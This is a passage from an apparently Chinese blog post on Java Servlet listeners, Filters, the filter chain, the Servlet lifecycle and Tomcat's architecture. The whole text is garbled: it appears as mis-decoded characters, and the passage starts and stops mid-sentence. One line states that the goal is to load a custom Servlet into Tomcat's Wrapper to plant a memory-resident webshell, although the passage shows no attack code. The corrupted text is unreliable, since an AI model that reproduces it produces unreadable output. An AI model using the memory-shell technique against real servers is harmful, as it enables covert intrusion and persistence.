é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚</p><h4 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h4><p>å¯ä»¥ä½¿ç”¨ç›‘å¬å™¨ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å‡ºå‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><h4 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>filter ä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ Servlet æŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨ HttpServletRequest åˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„ HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥ HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨ HttpServletResponse åˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆª HttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥ HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ HttpServletResponse å¤´å’Œæ•°æ®ã€‚</p><h4 id="åŸºæœ¬å·¥ä½œåŸç†"><a href="#åŸºæœ¬å·¥ä½œåŸç†" class="headerlink" title="åŸºæœ¬å·¥ä½œåŸç†"></a>åŸºæœ¬å·¥ä½œåŸç†</h4><p>1ã€Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„ Java ç±»ï¼Œä¸ Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”± Servlet å®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ã€‚</p><p>2ã€å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ª Filter æ¥å¯¹æŸä¸ª Servlet ç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚</p><p>3ã€å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚</p><p>4ã€ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ—¶é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚</p><p>5ã€åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚</p><p>6ã€å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚</p><h4 id="Filterçš„å®ç°"><a href="#Filterçš„å®ç°" class="headerlink" title="Filterçš„å®ç°"></a>Filterçš„å®ç°</h4><p>Filteræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ç°ä¸€ä¸ªFilteråªéœ€è¦é‡å†™<code>init</code>ã€<code>doFilter</code>ã€<code>destroy</code>æ–¹æ³•å³å¯ï¼Œå…¶ä¸­è¿‡æ»¤é€»è¾‘éƒ½åœ¨<code>doFilter</code>æ–¹æ³•ä¸­å®ç°ã€‚</p><p><code>Filter</code>çš„é…ç½®ç±»ä¼¼äº<code>Servlet</code>ï¼Œç”±<code>&lt;filter&gt;</code>å’Œ<code>&lt;filter-mapping&gt;</code>ä¸¤ç»„æ ‡ç­¾ç»„æˆï¼Œå¦‚æœServletç‰ˆæœ¬å¤§äº3.0åŒæ ·å¯ä»¥ä½¿ç”¨æ³¨è§£çš„æ–¹å¼é…ç½®Filterã€‚</p><h4 id="Filter-çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#Filter-çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Filter çš„ç”Ÿå‘½å‘¨æœŸ"></a>Filter çš„ç”Ÿå‘½å‘¨æœŸ</h4><p>ä¸ servlet ä¸€æ ·ï¼ŒFilter çš„åˆ›å»ºå’Œé”€æ¯ä¹Ÿç”± Web å®¹å™¨è´Ÿè´£ã€‚Web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼ŒWeb æœåŠ¡å™¨å°†åˆ›å»º Filter çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ init() æ–¹æ³•ï¼Œè¯»å– web.xml é…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œï¼ˆfilter å¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinit æ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚å¼€å‘äººå‘˜é€šè¿‡initæ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰filteré…ç½®ä¿¡æ¯çš„FilterConfigå¯¹è±¡ã€‚Filter å¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“ Web åº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ã€‚åœ¨ Web å®¹å™¨å¸è½½ Filter å¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ã€‚è¯¥æ–¹æ³•åœ¨ Filter çš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æºã€‚</p><h4 id="Filteré“¾"><a href="#Filteré“¾" class="headerlink" title="Filteré“¾"></a>Filteré“¾</h4><p>å½“å¤šä¸ª Filter åŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº† Filter é“¾ã€‚Web æœåŠ¡å™¨æ ¹æ® Filter åœ¨ web.xml æ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ª Filterã€‚å½“ç¬¬ä¸€ä¸ª Filter çš„ doFilter æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨ Filter é“¾çš„ FilterChain å¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­ FilterChain ä¸­æ˜¯å¦è¿˜æœ‰ Filter å†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨ Filterã€‚</p><p><img src="https://i.mji.rip/2023/10/25/6d4449465499c6afd9ae26f7a9c1f185.png" alt="image-20231025195002798"></p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><h4 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p><code>Servlet</code>æ˜¯åœ¨ <code>Java Web</code>å®¹å™¨ä¸­è¿è¡Œçš„<code>å°ç¨‹åº</code>,é€šå¸¸æˆ‘ä»¬ç”¨<code>Servlet</code>æ¥å¤„ç†ä¸€äº›è¾ƒä¸ºå¤æ‚çš„æœåŠ¡å™¨ç«¯çš„ä¸šåŠ¡é€»è¾‘ã€‚<code>Servlet</code>æ˜¯<code>Java EE</code>çš„æ ¸å¿ƒ,ä¹Ÿæ˜¯æ‰€æœ‰çš„MVCæ¡†æ¶çš„å®ç°çš„æ ¹æœ¬ã€‚</p><h4 id="è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹"><a href="#è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹" class="headerlink" title="è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹"></a>è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹</h4><p>å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ª http è¯·æ±‚ï¼Œæ¯”å¦‚ get ç±»å‹ã€‚</p><p>Servlet å®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆ HttpServletRequest å’ŒHttpServletResponse å¯¹è±¡ã€‚è¿™æ­¥ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ä¼ å‚ã€‚</p><p>Servletå®¹å™¨è°ƒç”¨ HttpServlet çš„ init() æ–¹æ³•ï¼Œinit æ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚</p><p>Servlet å®¹å™¨è°ƒç”¨ service() æ–¹æ³•ã€‚</p><p>service() æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œè¿™é‡Œæ˜¯getç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨doGetæ–¹æ³•ã€‚</p><p>doXXX æ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„ä¸šåŠ¡é€»è¾‘ã€‚</p><p>ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™ Servlet å®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨ destory æ–¹æ³•ã€‚</p><h4 id="Servletçš„å®šä¹‰"><a href="#Servletçš„å®šä¹‰" class="headerlink" title="Servletçš„å®šä¹‰"></a>Servletçš„å®šä¹‰</h4><p><strong>web.xmlçš„é…ç½®ï¼š</strong></p><p><code>Servlet3.0</code> ä¹‹å‰çš„ç‰ˆæœ¬éƒ½éœ€è¦åœ¨<code>web.xml</code> ä¸­é…ç½®<code>servletæ ‡ç­¾</code>ï¼Œ<code>servletæ ‡ç­¾</code>æ˜¯ç”±<code>servlet</code>å’Œ<code>servlet-mapping</code>æ ‡ç­¾ç»„æˆçš„,ä¸¤è€…ä¹‹é—´é€šè¿‡åœ¨<code>servlet</code>å’Œ<code>servlet-mapping</code>æ ‡ç­¾ä¸­åŒæ ·çš„<code>servlet-name</code>åç§°æ¥å®ç°å…³è”çš„ã€‚</p><p><strong>æ³¨è§£é…ç½®ï¼š</strong></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯åœ¨ Servlet 3.0 ä¹‹å( Tomcat7+)å¯ä»¥ä½¿ç”¨æ³¨è§£æ–¹å¼é…ç½® Servlet äº†,åœ¨ä»»æ„çš„Javaç±»æ·»åŠ <code>javax.servlet.annotation.WebServlet</code>æ³¨è§£å³å¯ã€‚</p><p>åŸºäºæ³¨è§£çš„æ–¹å¼é…ç½®Servletå®è´¨ä¸Šæ˜¯å¯¹åŸºäº<code>web.xml</code>æ–¹å¼é…ç½®çš„ç®€åŒ–ï¼Œæå¤§çš„ç®€åŒ–äº†Servletçš„é…ç½®æ–¹å¼ï¼Œä½†æ˜¯ä¹Ÿæå‡äº†å¯¹Servleté…ç½®ç®¡ç†çš„éš¾åº¦ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¾—ä¸å»æŸ¥æ‰¾æ‰€æœ‰åŒ…å«äº†<code>@WebServlet</code>æ³¨è§£çš„ç±»æ¥å¯»æ‰¾Servletçš„å®šä¹‰ï¼Œè€Œä¸å†åªæ˜¯æŸ¥çœ‹<code>web.xml</code>ä¸­çš„<code>servlet</code>æ ‡ç­¾é…ç½®ã€‚</p><p><strong>å®ç°ï¼š</strong></p><p>å®šä¹‰ä¸€ä¸ª Servlet å¾ˆç®€å•ï¼Œåªéœ€è¦ç»§æ‰¿<code>javax.servlet.http.HttpServlet</code>ç±»å¹¶é‡å†™<code>doXXX</code>(å¦‚<code>doGetã€doPost</code>)æ–¹æ³•æˆ–è€…<code>service</code>æ–¹æ³•å°±å¯ä»¥äº†ï¼Œå…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯é‡å†™<code>HttpServlet</code>ç±»çš„<code>service</code>æ–¹æ³•å¯ä»¥è·å–åˆ°ä¸Šè¿°ä¸ƒç§Httpè¯·æ±‚æ–¹æ³•çš„è¯·æ±‚ã€‚ï¼ˆdoGet&#x2F;doPost&#x2F;doDelete&#x2F;doHead&#x2F;doPut&#x2F;doOptions&#x2F;doTraceï¼‰</p><h4 id="servletç”Ÿå‘½å‘¨æœŸ"><a href="#servletç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="servletç”Ÿå‘½å‘¨æœŸ"></a>servletç”Ÿå‘½å‘¨æœŸ</h4><p>1ï¼‰æœåŠ¡å™¨å¯åŠ¨æ—¶ (web.xml ä¸­é…ç½® load-on-startup&#x3D;1ï¼Œé»˜è®¤ä¸º 0)æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥ servlet æ—¶ï¼Œå°±ä¼šåˆå§‹åŒ–ä¸€ä¸ª Servlet å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• init(ServletConfig conf)ã€‚</p><p>2ï¼‰servlet å¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨ service(ServletRequest reqï¼ŒServletResponse res) æ–¹æ³•ä¸­æ‰§è¡Œ</p><p>3ï¼‰æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ª servlet å¯¹è±¡ï¼Œæ‰§è¡Œ destroy() æ–¹æ³•ã€‚</p><p>4ï¼‰ç”± JVM è¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p><h3 id="Request-å’Œ-Response"><a href="#Request-å’Œ-Response" class="headerlink" title="Request å’Œ Response"></a>Request å’Œ Response</h3><p>åœ¨<code>B/Sæ¶æ„</code>ä¸­æœ€é‡è¦çš„å°±æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ç«¯äº¤äº’ï¼Œ<code>Java EE</code>å°†å…¶å°è£…ä¸º<code>è¯·æ±‚</code>å’Œ<code>å“åº”å¯¹è±¡</code>ï¼Œå³ <code>request(HttpServletRequest)</code> å’Œ <code>response(HttpServletResponse)</code>ã€‚</p><p><code>HttpServletRequest</code>å¯¹è±¡ç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå½“å®¢æˆ·ç«¯é€šè¿‡HTTPåè®®è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒHTTP ä¸­çš„æ‰€æœ‰ä¿¡æ¯éƒ½å°è£…åœ¨è¿™ä¸ªå¯¹è±¡ä¸­ï¼Œé€šè¿‡<code>HttpServletRequest</code>å¯¹è±¡å¯ä»¥è·å–åˆ°å®¢æˆ·ç«¯è¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><p><code>HttpServletResponse</code>å¯¹è±¡ç”¨äºå“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œé€šè¿‡<code>HttpServletResponse</code>å¯¹è±¡å¯ä»¥å¤„ç†æœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·ç«¯è¯·æ±‚å“åº”ã€‚</p><h3 id="Filterå’ŒServletæ€»ç»“ï¼š"><a href="#Filterå’ŒServletæ€»ç»“ï¼š" class="headerlink" title="Filterå’ŒServletæ€»ç»“ï¼š"></a>Filterå’ŒServletæ€»ç»“ï¼š</h3><ol><li><code>Filter</code>å’Œ<code>Servlet</code>éƒ½éœ€è¦åœ¨<code>web.xml</code>æˆ–<code>æ³¨è§£</code>(<code>@WebFilter</code>ã€<code>@WebServlet</code>)ä¸­é…ç½®ï¼Œè€Œä¸”é…ç½®æ–¹å¼æ˜¯éå¸¸çš„ç›¸ä¼¼çš„ã€‚</li><li><code>Filter</code>å’Œ<code>Servlet</code>éƒ½å¯ä»¥å¤„ç†æ¥è‡ªHttpè¯·æ±‚çš„è¯·æ±‚ï¼Œä¸¤è€…éƒ½æœ‰<code>request</code>ã€<code>response</code>å¯¹è±¡ã€‚</li><li><code>Filter</code>å’Œ<code>Servlet</code>åŸºç¡€æ¦‚å¿µä¸ä¸€æ ·ï¼Œ<code>Servlet</code>å®šä¹‰æ˜¯å®¹å™¨ç«¯å°ç¨‹åºï¼Œç”¨äºç›´æ¥å¤„ç†åç«¯ä¸šåŠ¡é€»è¾‘ï¼Œè€Œ<code>Filter</code>çš„æ€æƒ³åˆ™æ˜¯å®ç°å¯¹Java Webè¯·æ±‚èµ„æºçš„æ‹¦æˆªè¿‡æ»¤ã€‚</li><li><code>Filter</code>å’Œ<code>Servlet</code>è™½ç„¶æ¦‚å¿µä¸Šä¸å¤ªä¸€æ ·ï¼Œä½†éƒ½å¯ä»¥å¤„ç†Httpè¯·æ±‚ï¼Œéƒ½å¯ä»¥ç”¨æ¥å®ç°MVCæ§åˆ¶å™¨(<code>Struts2</code>å’Œ<code>Spring</code>æ¡†æ¶åˆ†åˆ«åŸºäº<code>Filter</code>å’Œ<code>Servlet</code>æŠ€æœ¯å®ç°çš„)ã€‚</li><li>ä¸€èˆ¬æ¥è¯´<code>Filter</code>é€šå¸¸é…ç½®åœ¨<code>MVC</code>ã€<code>Servlet</code>å’Œ<code>JSP</code>è¯·æ±‚å‰é¢ï¼Œå¸¸ç”¨äºåç«¯æƒé™æ§åˆ¶ã€ç»Ÿä¸€çš„Httpè¯·æ±‚å‚æ•°è¿‡æ»¤(<code>ç»Ÿä¸€çš„XSS</code>ã€<code>SQLæ³¨å…¥</code>ã€<code>Struts2å‘½ä»¤æ‰§è¡Œ</code>ç­‰æ”»å‡»æ£€æµ‹å¤„ç†)å¤„ç†ï¼Œå…¶æ ¸å¿ƒä¸»è¦ä½“ç°åœ¨è¯·æ±‚è¿‡æ»¤ä¸Šï¼Œè€Œ<code>Servlet</code>æ›´å¤šçš„æ˜¯ç”¨æ¥å¤„ç†åç«¯ä¸šåŠ¡è¯·æ±‚ä¸Šã€‚</li></ol><h2 id="Tomcat-åŸºç¡€ä»‹ç»"><a href="#Tomcat-åŸºç¡€ä»‹ç»" class="headerlink" title="Tomcat åŸºç¡€ä»‹ç»"></a>Tomcat åŸºç¡€ä»‹ç»</h2><h3 id="ä»€ä¹ˆæ˜¯-Tomcat"><a href="#ä»€ä¹ˆæ˜¯-Tomcat" class="headerlink" title="ä»€ä¹ˆæ˜¯ Tomcat"></a>ä»€ä¹ˆæ˜¯ Tomcat</h3><p>å¤§è‡´å¯ä»¥é€šè¿‡å¯¹æ ‡ Apache æ¥çœ‹ä¸€çœ‹ã€‚</p><p>Apache æ˜¯ web æœåŠ¡å™¨ï¼ˆé™æ€è§£æï¼Œå¦‚ HTMLï¼‰ï¼Œtomcat æ˜¯ java åº”ç”¨æœåŠ¡å™¨ï¼ˆåŠ¨æ€è§£æï¼Œå¦‚ JSPï¼‰</p><p>Tomcat åªæ˜¯ä¸€ä¸ª servlet(jsp ä¹Ÿç¿»è¯‘æˆ servlet)å®¹å™¨ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ apache çš„æ‰©å±•ï¼Œä½†æ˜¯å¯ä»¥ç‹¬ç«‹äº apache è¿è¡Œã€‚</p><ul><li>â€‹ä¸€å¥è¯æ¦‚æ‹¬ä¸€ä¸‹ï¼Œå°±æ˜¯ Web æœåŠ¡å™¨ï¼Œæ¯”è¾ƒä¸ç¨³å®šï¼Œä½†æ˜¯ä¸šåŠ¡èƒ½åŠ›æ¯”è¾ƒå¼ºã€‚</li></ul><h3 id="Tomcat-ä¸-Servlet-çš„å…³ç³»"><a href="#Tomcat-ä¸-Servlet-çš„å…³ç³»" class="headerlink" title="Tomcat ä¸ Servlet çš„å…³ç³»"></a>Tomcat ä¸ Servlet çš„å…³ç³»</h3><p>æˆ‘ä»¬æ ¹æ®ä¸Šé¢çš„åŸºç¡€çŸ¥è¯†å¯ä»¥çŸ¥é“Tomcat æ˜¯Webåº”ç”¨æœåŠ¡å™¨ï¼Œæ˜¯ä¸€ä¸ªServlet&#x2F;JSPå®¹å™¨ï¼Œè€ŒServletå®¹å™¨ä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ Engineã€Hostã€Contextã€Wrapperã€‚</p><p>åœ¨Tomcatä¸­Wrapperä»£è¡¨ä¸€ä¸ªç‹¬ç«‹çš„servletå®ä¾‹ï¼ŒStandardWrapperæ˜¯Wrapperæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼ˆStandardWrapper çš„ä¸»è¦ä»»åŠ¡å°±æ˜¯è½½å…¥Servletç±»å¹¶ä¸”è¿›è¡Œå®ä¾‹åŒ–ï¼‰ï¼ŒåŒæ—¶å…¶ä»ContainerBaseç±»ç»§æ‰¿è¿‡æ¥ï¼Œè¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œåªæ˜¯ä»–æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œä¸èƒ½å†å«æœ‰ä»»ä½•çš„å­å®¹å™¨äº†ï¼Œä¸”å…¶çˆ¶å®¹å™¨åªèƒ½æ˜¯contextã€‚è€Œæˆ‘ä»¬åœ¨ä¹Ÿå°±æ˜¯éœ€è¦åœ¨è¿™é‡Œå»è½½å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„ServletåŠ è½½æˆ‘ä»¬çš„å†…å­˜é©¬ã€‚</p><h2 id="Tomcat-æ¶æ„"><a href="#Tomcat-æ¶æ„" class="headerlink" title="Tomcat æ¶æ„"></a>Tomcat æ¶æ„</h2><h3 id="Tomcat-æ¶æ„åŸç†"><a href="#Tomcat-æ¶æ„åŸç†" class="headerlink" title="Tomcat æ¶æ„åŸç†"></a>Tomcat æ¶æ„åŸç†</h3><p>tomcatçš„æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰serverã€serviceã€connectorã€container å››ä¸ªéƒ¨åˆ† </p><p><img src="https://i.mji.rip/2023/10/25/f4d63124cec3f9b9fd6fba648346cf25.png" alt="image-20231025195032719"></p><p>å›¾ä¸­å¯ä»¥çœ‹å‡º Tomcat çš„å¿ƒè„æ˜¯ä¸¤ä¸ªç»„ä»¶ï¼šConnector å’Œ Containerï¼š<br>Connector ä¸»è¦è´Ÿè´£å¯¹å¤–äº¤æµï¼Œè¿›è¡Œ Socket é€šä¿¡(åŸºäº TCP&#x2F;IP)ï¼Œè§£æ HTTP æŠ¥æ–‡ï¼Œå¯¹åº”ä¸‹å›¾ä¸­çš„httpæœåŠ¡å™¨ï¼›</p><p>Container ä¸»è¦å¤„ç† Connector æ¥å—çš„è¯·æ±‚ï¼Œä¸»è¦æ˜¯å¤„ç†å†…éƒ¨äº‹åŠ¡ï¼ŒåŠ è½½å’Œç®¡ç† Servletï¼Œç”± Servlet å…·ä½“è´Ÿè´£å¤„ç† Request è¯·æ±‚ï¼Œå¯¹åº”ä¸‹å›¾ä¸­çš„servletå®¹å™¨ã€‚</p><p><img src="https://i.mji.rip/2023/10/25/7f4b4458ea66cb54b7f40e58e423a156.png" alt="image-20231025195050119"></p><p>ä»¥ä¸Šä¸¤ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«å¯¹åº”ç€tomcatçš„ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶è¿æ¥å™¨ï¼ˆConnectorï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰ï¼Œè¿æ¥å™¨è´Ÿè´£å¯¹å¤–äº¤æµï¼ˆå®Œæˆ Http æœåŠ¡å™¨åŠŸèƒ½ï¼‰ï¼Œå®¹å™¨è´Ÿè´£å†…éƒ¨å¤„ç†ï¼ˆå®Œæˆ Servlet å®¹å™¨åŠŸèƒ½ï¼‰ã€‚</p><p><img src="https://i.mji.rip/2023/10/25/073ffe27f239822d2a31649cff8f34b9.md.png" alt="image-20231025195111671"></p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>å³æœåŠ¡å™¨ï¼Œä»£è¡¨æ•´ä¸ª Tomcat æœåŠ¡å™¨ï¼Œå®ƒè¦èƒ½å¤Ÿæä¾›ä¸€ä¸ªæ¥å£è®©å…¶å®ƒç¨‹åºèƒ½å¤Ÿè®¿é—®åˆ°è¿™ä¸ª Service é›†åˆã€åŒæ—¶è¦ç»´æŠ¤å®ƒæ‰€åŒ…å«çš„æ‰€æœ‰ Service çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬å¦‚ä½•åˆå§‹åŒ–ã€å¦‚ä½•ç»“æŸæœåŠ¡ã€å¦‚ä½•æ‰¾åˆ°åˆ«äººè¦è®¿é—®çš„ Serviceã€‚è¿˜æœ‰å…¶å®ƒçš„ä¸€äº›æ¬¡è¦çš„ä»»åŠ¡ï¼Œå¦‚æ‚¨ä½åœ¨è¿™ä¸ªåœ°æ–¹è¦å‘å½“åœ°æ”¿åºœå»ç™»è®°å•Šã€å¯èƒ½è¿˜æœ‰è¦é…åˆå½“åœ°å…¬å®‰æœºå…³æ—¥å¸¸çš„å®‰å…¨æ£€æŸ¥ä»€ä¹ˆçš„ã€‚</p><p>ä¸€ä¸ª Tomcat åªæœ‰ä¸€ä¸ª Server Server ä¸­åŒ…å«è‡³å°‘ä¸€ä¸ª Service ç»„ä»¶ï¼Œç”¨äºæä¾›å…·ä½“æœåŠ¡ã€‚</p><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>Service ä¸»è¦æ˜¯ä¸ºäº†å…³è” Connector å’Œ Containerï¼ŒåŒæ—¶ä¼šåˆå§‹åŒ–å®ƒä¸‹é¢çš„å…¶å®ƒç»„ä»¶ï¼Œåœ¨ Connector å’Œ Container å¤–é¢å¤šåŒ…ä¸€å±‚ï¼ŒæŠŠå®ƒä»¬ç»„è£…åœ¨ä¸€èµ·ï¼Œå‘å¤–é¢æä¾›æœåŠ¡ï¼Œä¸€ä¸ª Service å¯ä»¥è®¾ç½®å¤šä¸ª Connectorï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ª Container å®¹å™¨ã€‚</p><p>Tomcat ä¸­ Service æ¥å£çš„æ ‡å‡†å®ç°ç±»æ˜¯ StandardService ï¼Œå®ƒä¸ä»…å®ç°äº† Service å€Ÿå£åŒæ—¶è¿˜å®ç°äº† Lifecycle æ¥å£ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥æ§åˆ¶å®ƒä¸‹é¢çš„ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸäº†</p><h3 id="connecter"><a href="#connecter" class="headerlink" title="connecter"></a>connecter</h3><p>Connector ç»„ä»¶æ˜¯ Tomcat ä¸­ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œå®ƒçš„ä¸»è¦ä»»åŠ¡æ˜¯è´Ÿè´£æ¥æ”¶æµè§ˆå™¨çš„å‘è¿‡æ¥çš„ tcp è¿æ¥è¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ª Request å’Œ Response 